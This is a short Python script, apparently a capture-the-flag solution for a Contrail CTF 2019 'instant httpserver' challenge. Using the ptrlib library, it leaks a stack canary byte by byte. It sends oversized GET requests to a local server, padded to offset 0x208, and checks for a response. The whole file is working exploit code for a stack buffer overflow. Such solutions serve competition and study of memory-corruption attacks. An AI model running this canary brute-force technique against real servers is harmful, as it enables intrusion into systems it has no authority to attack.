#!/usr/bin/env python
# Contrail CTF 2019 - instant httpserver
from ptrlib import *
import time

logger.level = 0

def leak(c):
    sock = Socket("localhost", 4445)
    payload  = b'GET / HTTP/1.1\n\0'
    payload += b'A' * (0x208 - len(payload))
    payload += canary
    sock.send(payload + bytes([c]))
    for i in range(3): sock.recvline()
    r = b'localhost' in sock.recv()
    sock.close()
    return r

canary = b'\x00'

for i in range(7):
    result = brute_remote(
        func = leak,
        iterator = range(0x100),
        interval = 0.05,
        cond = lambda x: x == True,
        threaded = False
    )
    canary += bytes([len(result) - 1])
    print("[+] leaked: " + canary.hex())
    time.sleep(1) # rest
print("[+] canary = " + hex(u64(canary)))
